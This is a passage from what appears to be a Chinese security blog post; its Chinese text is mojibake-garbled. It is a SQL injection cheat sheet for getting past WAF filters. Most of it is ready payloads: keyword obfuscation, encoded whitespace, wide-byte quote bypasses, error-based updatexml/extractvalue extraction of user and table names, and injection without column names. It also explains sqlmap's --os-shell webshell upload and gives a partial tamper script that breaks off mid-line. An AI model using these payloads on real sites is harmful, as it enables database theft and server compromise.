<h2 id="è¿‡æ»¤union-select"><a href="#è¿‡æ»¤union-select" class="headerlink" title="è¿‡æ»¤union\select"></a>è¿‡æ»¤union\select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users</span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶å­—ç¬¦ç»•è¿‡</span><br><span class="line"><span class="keyword">select</span> â€”â€”<span class="operator">&gt;</span> selec\x74</span><br><span class="line"><span class="keyword">union</span>â€”â€”<span class="operator">&gt;</span>unio\x6e</span><br><span class="line"></span><br><span class="line">å¤§å°å†™ç»•è¿‡</span><br><span class="line"><span class="keyword">SelEct</span></span><br><span class="line"></span><br><span class="line">åŒå†™ç»•è¿‡</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencodeï¼Œascii(<span class="type">char</span>)ï¼Œhexï¼Œunicodeç¼–ç ç»•è¿‡</span><br><span class="line"></span><br><span class="line">å…³é”®å­—å†…è”ç»•æ‰€æœ‰</span><br><span class="line"><span class="comment">/*!union*/</span></span><br><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ç”¨Tabä»£æ›¿ç©ºæ ¼<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span>()</span><br><span class="line">ç»•è¿‡ç©ºæ ¼æ³¨é‡Šç¬¦ç»•è¿‡<span class="operator">/</span><span class="operator">/</span><span class="comment">--%20/**/#--+-- -;%00;</span></span><br><span class="line"></span><br><span class="line">ç©ºç™½å­—ç¬¦ç»•è¿‡SQLite3  â€”â€”     <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>c,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MYSQL</span><br><span class="line">    <span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>B,<span class="number">0</span>D,A0,<span class="number">20</span></span><br><span class="line">PosgressSQL</span><br><span class="line">    <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">Oracle_11g</span><br><span class="line">    <span class="number">00</span>,<span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MSSQL</span><br><span class="line">    <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="keyword">OF</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line">ç‰¹æ®Šç¬¦å·ç»•è¿‡</span><br><span class="line">    `  <span class="operator">+</span>  ï¼</span><br><span class="line">ç­‰ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</span><br><span class="line">    ä¾‹ï¼š</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id0e1union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">unicodeç¼–ç </span><br><span class="line">    <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">    <span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span>c0<span class="operator">%</span>a0 <span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤-x3D"><a href="#è¿‡æ»¤-x3D" class="headerlink" title="è¿‡æ»¤&#x3D;"></a>è¿‡æ»¤&#x3D;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1 like 1#å¯ä»¥ç»•è¿‡å¯¹ = &gt; ç­‰è¿‡æ»¤</span></span><br><span class="line"><span class="string">or &#x27;</span><span class="number">1</span><span class="string">&#x27; IN (&#x27;</span><span class="number">1234</span><span class="string">&#x27;)#å¯ä»¥æ›¿ä»£=</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤æ¯”è¾ƒç¬¦-lt-gt"><a href="#è¿‡æ»¤æ¯”è¾ƒç¬¦-lt-gt" class="headerlink" title="è¿‡æ»¤æ¯”è¾ƒç¬¦&lt;&gt;"></a>è¿‡æ»¤æ¯”è¾ƒç¬¦&lt;&gt;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤where"><a href="#è¿‡æ»¤where" class="headerlink" title="è¿‡æ»¤where"></a>è¿‡æ»¤where</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤limit"><a href="#è¿‡æ»¤limit" class="headerlink" title="è¿‡æ»¤limit"></a>è¿‡æ»¤limit</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_idèšåˆä¸­user_idä¸º<span class="number">1</span>çš„<span class="keyword">user</span>ä¸ºadmin</span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤group-by"><a href="#è¿‡æ»¤group-by" class="headerlink" title="è¿‡æ»¤group by"></a>è¿‡æ»¤group by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤select"><a href="#è¿‡æ»¤select" class="headerlink" title="è¿‡æ»¤select"></a>è¿‡æ»¤select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤â€™-å•å¼•å·"><a href="#è¿‡æ»¤â€™-å•å¼•å·" class="headerlink" title="è¿‡æ»¤â€™(å•å¼•å·)"></a>è¿‡æ»¤â€™(å•å¼•å·)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å®½å­—èŠ‚ç»•è¿‡</span></span><br><span class="line"><span class="string">%bf%27 %df%27 %aa%27</span></span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤é€—å·"><a href="#è¿‡æ»¤é€—å·" class="headerlink" title="è¿‡æ»¤é€—å·"></a>è¿‡æ»¤é€—å·</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨<span class="keyword">from</span> <span class="keyword">to</span>çš„æ–¹å¼æ¥è§£å†³ï¼š</span><br><span class="line">selectsubstr(database(<span class="number">0</span>from1for1);selectmid(database(<span class="number">0</span>from1for1);</span><br><span class="line"></span><br><span class="line">å¯¹äºlimitå¯ä»¥ä½¿ç”¨<span class="keyword">offset</span>æ¥ç»•è¿‡ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromnews limit0,<span class="number">1</span># ç­‰ä»·äºä¸‹é¢è¿™æ¡<span class="keyword">SQL</span>è¯­å¥<span class="keyword">select</span><span class="operator">*</span>fromnews limit1offset0</span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤hex"><a href="#è¿‡æ»¤hex" class="headerlink" title="è¿‡æ»¤hex"></a>è¿‡æ»¤hex</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #åè¿›åˆ¶çš„<span class="number">11</span>è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚</span><br></pre></td></tr></table></figure>


<h2 id="è¿‡æ»¤substr"><a href="#è¿‡æ»¤substr" class="headerlink" title="è¿‡æ»¤substr"></a>è¿‡æ»¤substr</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">é€»è¾‘ç»•è¿‡</span><br><span class="line"></span><br><span class="line">è¿‡æ»¤ä»£ç  <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) </span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p>åˆ©ç”¨urlencodeï¼Œascii(char)ï¼Œhexï¼Œunicodeç­‰ç¼–ç ç»•è¿‡</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>å³<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸º<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)ã€‚</span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶ç¼–ç </span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">åŒé‡ç¼–ç ç»•è¿‡</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<h2 id="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"><a href="#ç­‰ä»·å‡½æ•°æˆ–å˜é‡" class="headerlink" title="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"></a>ç­‰ä»·å‡½æ•°æˆ–å˜é‡</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()ã€bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()ã€substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼š<span class="built_in">substring</span>()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>ã€€</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>


<h2 id="ç”Ÿåƒ»å‡½æ•°"><a href="#ç”Ÿåƒ»å‡½æ•°" class="headerlink" title="ç”Ÿåƒ»å‡½æ•°"></a>ç”Ÿåƒ»å‡½æ•°</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PostgreSQLæ”¯æŒXMLå‡½æ•°ï¼š<span class="keyword">Select</span> UpdateXML(â€˜<span class="operator">&lt;</span>script x<span class="operator">=</span>_<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span> â€™,â€™<span class="operator">/</span>script<span class="operator">/</span><span class="variable">@x</span><span class="operator">/</span>â€™,â€™src<span class="operator">=</span><span class="operator">/</span><span class="operator">/</span>evil.comâ€™);ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> xmlelement(name img,xmlattributes(<span class="number">1</span><span class="keyword">as</span> src,<span class="string">&#x27;a\l\x65rt(1)&#x27;</span><span class="keyword">as</span> \<span class="number">117</span>n\x65rror));ã€€<span class="operator">/</span><span class="operator">/</span>postgresql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>))</span><br></pre></td></tr></table></figure>


<h2 id="Nç»•è¿‡"><a href="#Nç»•è¿‡" class="headerlink" title="\Nç»•è¿‡"></a>\Nç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h2 id="PCREç»•è¿‡"><a href="#PCREç»•è¿‡" class="headerlink" title="PCREç»•è¿‡"></a>PCREç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP çš„ pcre.backtrack_limit é™åˆ¶åˆ©ç”¨</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p><font color="red"> ä¸Šé¢çš„è¿˜ä¸è¡Œå°±å°è¯•ä¿®æ”¹è¯­å¥é€»è¾‘å†ç»•è¿‡è¯•è¯•</font> </p>
<h1 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a><center>æ— åˆ—åæ³¨å…¥</center></h1><p>é‡åˆ°information_schema.tablesè¢«è¿‡æ»¤ã€è½¬ä¹‰ã€åˆ é™¤çš„æƒ…å†µä¸‹ä½¿ç”¨</p>
<p>Payload</p>
<p>çŒœè¡¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>çŒœæ•°æ®</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><center>Sqlmap</center></h1><h2 id="â€“os-shellçš„åŸç†"><a href="#â€“os-shellçš„åŸç†" class="headerlink" title="â€“os-shellçš„åŸç†"></a>â€“os-shellçš„åŸç†</h2><ul>
<li>ä½¿ç”¨æ¡ä»¶<ol>
<li>ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™</li>
<li>æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li>
<li>GPCä¸ºoffï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­</li>
</ol>
</li>
</ul>
<p>ç”¨into outfileå‡½æ•°å°†ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä¸Šä¼ çš„phpæ–‡ä»¶å†™åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownunsKjTko6QxSAY3.png"></p>
<p>ä¹Ÿå°±æ˜¯ä¸Šä¼ ä¸€ä¸ªåŠŸèƒ½é©¬</p>
<h2 id="è„šæœ¬ç¼–å†™"><a href="#è„šæœ¬ç¼–å†™" class="headerlink" title="è„šæœ¬ç¼–å†™"></a>è„šæœ¬ç¼–å†™</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##æ­¤å¤„ç”¨æ³•ä¸ºï¼šç¨‹åºåˆ°envè®¾ç½®é‡ŒæŸ¥æ‰¾pythonçš„å®‰è£…è·¯å¾„ï¼Œå†è°ƒç”¨å¯¹åº”è·¯å¾„ä¸‹çš„è§£é‡Šå™¨ç¨‹åºå®Œæˆ</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¤šè¡Œæ³¨é‡Šç¬¦ï¼Œæ­¤å¤„ä¸ºä¸‰ä¸ªåŒå¼•å·ï¼Œå› ä¸ºæ˜¯å…¶ä¸­ä¹Ÿæœ‰å•å¼•å·ï¼Œå¹¶ä¸”è¯¥è¯´æ˜ä¸ºä¸€èˆ¬æ–‡æ¡£è¯´æ˜ï¼Œæ•…ç”¨ä¸‰ä¸ªåŒå¼•å·</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#å¯¼å…¥pythonä¸­çš„re å­—ç¬¦æ›¿æ¢åŒ…ï¼Œæ–¹ä¾¿ä¸‹é¢çš„å­—ç¬¦æ›¿æ¢</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb <span class="comment">#å¯¼å…¥sqlmapä¸­lib\core\dataä¸­çš„kbå‡½æ•°ï¼Œæµ‹è¯• SQL æ³¨å…¥çš„è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨çš„é…ç½®æ–‡ä»¶äº‹å…ˆå…¨éƒ¨è¢«åŠ è½½åˆ°äº† conf å’Œ kb</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY  <span class="comment">#å¯¼å…¥sqlmapä¸­lib\core\enumsä¸­çš„PRIORITYå‡½æ•°ï¼Œ LOWEST = -100ï¼ŒLOWER = -50ï¼Œ. è¯¦ç»†è§enums.py</span></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL <span class="comment">#å®šä¹‰ä¼˜å…ˆçº§ï¼Œæ­¤å¤„ä¸ºçº§åˆ«ä¸ºã€ä¸€èˆ¬ã€‘</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():  <span class="comment">#å®šä¹‰dependencies():æ­¤å¤„æ˜¯ä¸ºäº†å’Œæ•´ä½“è„šæœ¬çš„ç»“æ„ä¿æŒä¸€è‡´ã€‚</span></span><br><span class="line">    <span class="keyword">pass</span>   <span class="comment">#pass ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥ã€‚ä¸ºäº†ä¿æŒç¨‹åºç»“æ„çš„å®Œæ•´æ€§ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):  <span class="comment">#å®šä¹‰tamperè„šæœ¬ï¼Œpayload, **kwargs ä¸ºå®šä¹‰çš„å‚æ•°ï¼Œå…¶ä¸­**kwargsä¸ºå­—å…¸å­˜å‚¨ï¼Œç±»ä¼¼äº &#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125; </span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span 